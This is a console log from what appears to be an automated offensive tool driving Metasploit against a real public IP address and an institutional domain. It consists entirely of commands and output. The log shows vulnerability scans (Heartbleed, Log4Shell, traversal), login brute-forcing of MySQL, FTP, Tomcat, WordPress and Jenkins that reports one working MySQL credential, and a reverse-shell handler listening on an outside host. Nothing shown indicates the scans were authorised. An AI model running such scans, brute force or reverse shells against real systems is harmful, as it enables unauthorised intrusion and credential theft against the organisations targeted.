+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 33.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/options
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 34.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/webdav_scanner
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 35.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/cert
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 36.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/tomcat_mgr_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 37.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/wordpress_xmlrpc_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 38.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/http_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] [*] 109.106.253.10:443   :/xmlrpc.php - Sending Hello...
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 39.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/ssl/openssl_heartbleed
+[  METASPLOIT] [*] Setting default action SCAN - view all 3 actions with the show actions command
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 40.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/ssl/openssl_ccs
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 41.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/log4shell_scanner
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 42.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/http/jenkins_login
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 443
+[  METASPLOIT] RPORT => 443
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 43.
+[  METASPLOIT] [-] Auxiliary aborted due to failure: bad-config: The SRVHOST option must be set to a routable IP address.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/imap/imap_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 993
+[  METASPLOIT] RPORT => 993
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 44.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/pop3/pop3_version
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RPORT 995
+[  METASPLOIT] RPORT => 995
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set SSL true
+[  METASPLOIT] [!] Changing the SSL option's value may require changing RPORT!
+[  METASPLOIT] SSL => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 45.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/mysql/mysql_version
+[  METASPLOIT] [*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 46.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> use auxiliary/scanner/mysql/mysql_login
+[  METASPLOIT] [*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set RHOSTS 109.106.253.10
+[  METASPLOIT] RHOSTS => 109.106.253.10
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set USER_AS_PASS true
+[  METASPLOIT] USER_AS_PASS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set BLANK_PASSWORDS true
+[  METASPLOIT] BLANK_PASSWORDS => true
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> set STOP_ON_SUCCESS false
+[  METASPLOIT] STOP_ON_SUCCESS => false
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> run -j
+[  METASPLOIT] [*] Auxiliary module running as background job 47.
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> jobs -l
+[  METASPLOIT] 
+[  METASPLOIT] Jobs
+[  METASPLOIT] ====
+[  METASPLOIT] 
+[  METASPLOIT]   Id  Name                                              Payload                    Payload opts
+[  METASPLOIT]   --  ----                                              -------                    ------------
+[  METASPLOIT]   0   Exploit: multi/handler                            generic/shell_reverse_tcp  tcp://202.180.25.41:4444
+[  METASPLOIT]   1   Auxiliary: scanner/portscan/tcp
+[  METASPLOIT]   2   Auxiliary: scanner/ftp/ftp_version
+[  METASPLOIT]   3   Auxiliary: scanner/ftp/anonymous
+[  METASPLOIT]   4   Auxiliary: scanner/ftp/ftp_login
+[  METASPLOIT]   5   Auxiliary: scanner/smtp/smtp_version
+[  METASPLOIT]   6   Auxiliary: scanner/smtp/smtp_enum
+[  METASPLOIT]   7   Auxiliary: scanner/smtp/smtp_relay
+[  METASPLOIT]   8   Auxiliary: scanner/smtp/smtp_ntlm_domain
+[  METASPLOIT]   9   Auxiliary: scanner/http/http_version
+[  METASPLOIT]   10  Auxiliary: scanner/http/ntlm_info_enumeration
+[  METASPLOIT]   11  Auxiliary: scanner/http/title
+[  METASPLOIT]   12  Auxiliary: scanner/http/options
+[  METASPLOIT]   13  Auxiliary: scanner/http/webdav_scanner
+[  METASPLOIT]   14  Auxiliary: scanner/http/http_put
+[  METASPLOIT]   15  Auxiliary: scanner/http/cert
+[  METASPLOIT]   16  Auxiliary: scanner/http/coldfusion_version
+[  METASPLOIT]   17  Auxiliary: scanner/http/glassfish_traversal
+[  METASPLOIT]   18  Auxiliary: scanner/http/joomla_version
+[  METASPLOIT]   19  Auxiliary: scanner/http/tomcat_mgr_login
+[  METASPLOIT]   20  Auxiliary: scanner/http/wordpress_xmlrpc_login
+[  METASPLOIT]   22  Auxiliary: scanner/http/http_login
+[  METASPLOIT]   23  Auxiliary: scanner/http/drupal_views_user_enum
+[  METASPLOIT]   24  Auxiliary: scanner/http/grafana_plugin_traversal
+[  METASPLOIT]   26  Auxiliary: scanner/http/jenkins_login
+[  METASPLOIT]   27  Auxiliary: scanner/pop3/pop3_version
+[  METASPLOIT]   28  Auxiliary: scanner/pop3/pop3_login
+[  METASPLOIT]   29  Auxiliary: scanner/imap/imap_version
+[  METASPLOIT]   30  Auxiliary: scanner/imap/imap_version
+[  METASPLOIT]   31  Auxiliary: scanner/http/http_version
+[  METASPLOIT]   32  Auxiliary: scanner/http/ntlm_info_enumeration
+[  METASPLOIT]   33  Auxiliary: scanner/http/title
+[  METASPLOIT]   34  Auxiliary: scanner/http/options
+[  METASPLOIT]   35  Auxiliary: scanner/http/webdav_scanner
+[  METASPLOIT]   36  Auxiliary: scanner/http/cert
+[  METASPLOIT]   37  Auxiliary: scanner/http/tomcat_mgr_login
+[  METASPLOIT]   38  Auxiliary: scanner/http/wordpress_xmlrpc_login
+[  METASPLOIT]   39  Auxiliary: scanner/http/http_login
+[  METASPLOIT]   40  Auxiliary: scanner/ssl/openssl_heartbleed
+[  METASPLOIT]   41  Auxiliary: scanner/ssl/openssl_ccs
+[  METASPLOIT]   43  Auxiliary: scanner/http/jenkins_login
+[  METASPLOIT]   44  Auxiliary: scanner/imap/imap_version
+[  METASPLOIT]   45  Auxiliary: scanner/pop3/pop3_version
+[  METASPLOIT]   46  Auxiliary: scanner/mysql/mysql_version
+[  METASPLOIT]   47  Auxiliary: scanner/mysql/mysql_login
+[  METASPLOIT] 
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> sleep 120
+[  METASPLOIT] [*] stikes.gunungsari.id  - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:21     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:21     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:25     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:25     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10:25     - Unable to establish an SMTP session
+[  METASPLOIT] [*] 109.106.253.10:25     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:25     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:80     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [*] 109.106.253.10:110    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:143    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:143    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:443    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [*] 109.106.253.10:443    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:443    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:993    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:995    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:3306 - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10:3306   - 109.106.253.10:3306 - Unable to connect: The connection with (109.106.253.10:3306) timed out.
+[  METASPLOIT] [*] 109.106.253.10:3306   - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] 109.106.253.10:3306   - Bruteforce completed, 1 credential was successful.
+[  METASPLOIT] [*] 109.106.253.10:3306   - You can open an MySQL session with these credentials and CreateSession set to true
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10: File doesn't seem to exist. The upload probably failed
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] Nothing was downloaded
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] XMLRPC is not enabled! Aborting
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] 109.106.253.10 does not appear to be vulnerable, will not continue
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] XMLRPC is not enabled! Aborting
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [!] 109.106.253.10:21     - No active DB -- Credential data will not be saved!
+[  METASPLOIT] [-] 109.106.253.10:21     - 109.106.253.10:21 - LOGIN FAILED: : (Unable to Connect: )
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] 109.106.253.10:110    - Could not connect: The connection with (109.106.253.10:110) timed out.
+[  METASPLOIT] [!] 109.106.253.10:110    - No active DB -- Credential data will not be saved!
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] It doesn't look like Joomla is up and running at /
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] http://109.106.253.10:80/manager/html - No response
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] http://109.106.253.10:443/manager/html - No response
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] 109.106.253.10:21     - 109.106.253.10:21 - LOGIN FAILED: : (Unable to Connect: )
+[  METASPLOIT] [-] The connection with (109.106.253.10:80) timed out.
+[  METASPLOIT] [-] http://109.106.253.10:80 No URI found that asks for HTTP authentication
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10:110    - Could not connect: The connection with (109.106.253.10:110) timed out.
+[  METASPLOIT] [-] The connection with (109.106.253.10:443) timed out.
+[  METASPLOIT] [-] https://109.106.253.10:443 No URI found that asks for HTTP authentication
+[  METASPLOIT] [*] Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10:21     - 109.106.253.10:21 - LOGIN FAILED: :admin (Unable to Connect: )
+[  METASPLOIT] [*] 109.106.253.10:21     - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] [-] 109.106.253.10:110    - Could not connect: The connection with (109.106.253.10:110) timed out.
+[  METASPLOIT] [*] 109.106.253.10:110    - Scanned 1 of 1 hosts (100% complete)
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> jobs -l
+[  METASPLOIT] 
+[  METASPLOIT] Jobs
+[  METASPLOIT] ====
+[  METASPLOIT] 
+[  METASPLOIT]   Id  Name                                           Payload                    Payload opts
+[  METASPLOIT]   --  ----                                           -------                    ------------
+[  METASPLOIT]   0   Exploit: multi/handler                         generic/shell_reverse_tcp  tcp://202.180.25.41:4444
+[  METASPLOIT]   10  Auxiliary: scanner/http/ntlm_info_enumeration
+[  METASPLOIT]   26  Auxiliary: scanner/http/jenkins_login
+[  METASPLOIT]   32  Auxiliary: scanner/http/ntlm_info_enumeration
+[  METASPLOIT]   43  Auxiliary: scanner/http/jenkins_login
+[  METASPLOIT] 
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> sessions -l
+[  METASPLOIT] 
+[  METASPLOIT] Active sessions
+[  METASPLOIT] ===============
+[  METASPLOIT] 
+[  METASPLOIT] No active sessions.
+[  METASPLOIT] 
+[  METASPLOIT] resource (/tmp/crushgear_msf_cocs8sg2.rc)> exit
+[  METASPLOIT] 
+
+                                                                  Scan Summary                                                                   
+┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━┳━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃ Tool           ┃ Status   ┃   Duration ┃ Output File                                                                                          ┃
+┡━━━━━━━━━━━━━━━━╇━━━━━━━━━━╇━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
+│ nmap           │ DONE     │     299.7s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/nmap.txt        │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ amass          │ ERROR    │       2.1s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/amass.txt       │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ httpx          │ ERROR    │       0.1s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/httpx.json      │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ netexec        │ DONE     │      24.6s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/netexec.txt     │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ smbmap         │ DONE     │       0.4s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/smbmap.txt      │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ nuclei         │ ERROR    │     900.1s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/nuclei.json     │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ feroxbuster    │ ERROR    │       0.0s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/feroxbuster.txt │
+├────────────────┼──────────┼────────────┼──────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│ metasploit     │ DONE     │     129.2s │ /home/kali/Documents/crush-gear/results/https___stikes_gunungsari_id_20260221_222712/metasploit.txt  │
+└────────────────┴──────────┴────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+All output saved to: /home/kali/Documents/cru
